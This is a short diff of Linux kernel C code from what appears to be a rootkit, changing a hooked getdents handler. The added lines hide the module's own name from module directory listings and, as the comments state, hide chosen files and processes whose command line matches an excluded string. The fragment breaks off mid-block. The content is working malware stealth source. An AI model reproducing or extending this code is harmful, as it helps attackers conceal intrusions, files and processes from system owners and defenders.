@@ -56,10 +56,17 @@ long hook_getdents_impl(unsigned int fd, char __user *dirp, long ret)
         d = (struct linux_dirent64 *)((char *)kdirent + offset);
         size_t shift_by = 0;
 
-        if (str_entry_is_excluded(d->d_name)) {
+#ifdef HIDE_MODULE
+        if (is_mod_directory(fd) && strstr(d->d_name, MODULE_NAME)) {
             shift_by = d->d_reclen;
             goto shift_and_iter;
-        } else if (is_numeric(d->d_name)) {
+        }
+#endif
+
+        if (str_entry_is_excluded(d->d_name)) { // hide files by custom filtering
+            shift_by = d->d_reclen;
+            goto shift_and_iter;
+        } else if (is_numeric(d->d_name)) { // hide processes that contain the excluded string in the cmdline
             int pid;
             if (kstrtoint(d->d_name, 10, &pid) == 0) {
                 char *cmdline;
